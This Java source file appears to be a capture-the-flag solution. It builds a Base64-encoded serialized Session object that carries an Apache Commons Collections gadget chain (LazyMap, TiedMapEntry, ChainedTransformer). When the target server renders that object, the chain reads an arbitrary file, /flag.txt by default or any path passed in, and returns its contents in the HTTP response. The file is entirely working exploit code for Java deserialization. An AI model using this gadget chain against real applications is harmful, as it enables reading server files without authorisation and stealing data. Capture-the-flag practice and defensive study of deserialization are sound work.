package com.k17.javanotes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Scanner;

/* Builds a genuine Main$Session whose notes list holds a TiedMapEntry.
 * sessionJson() -> String.valueOf(notes.get(0)) -> TiedMapEntry.toString()
 *   -> LazyMap.get("flag") -> ChainedTransformer
 *   -> new Scanner(new File(path)).useDelimiter("\\A").next()
 * so the file contents come straight back in the HTTP response. */
public class Gen {
    @SuppressWarnings({"unchecked", "rawtypes"})
    public static void main(String[] args) throws Exception {
        String path = args.length > 0 ? args[0] : "/flag.txt";

        Transformer chain = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(Scanner.class),
            new InstantiateTransformer(new Class[]{File.class}, new Object[]{new File(path)}),
            new InvokerTransformer("useDelimiter", new Class[]{String.class}, new Object[]{"\\A"}),
            new InvokerTransformer("next", new Class[0], new Object[0]),
        });

        Map lazy = LazyMap.decorate(new HashMap(), chain);
        List notes = new ArrayList();
        notes.add(new TiedMapEntry(lazy, "flag"));

        Main.Session s = new Main.Session("pwn", "dark", notes);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(baos)) { oos.writeObject(s); }
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
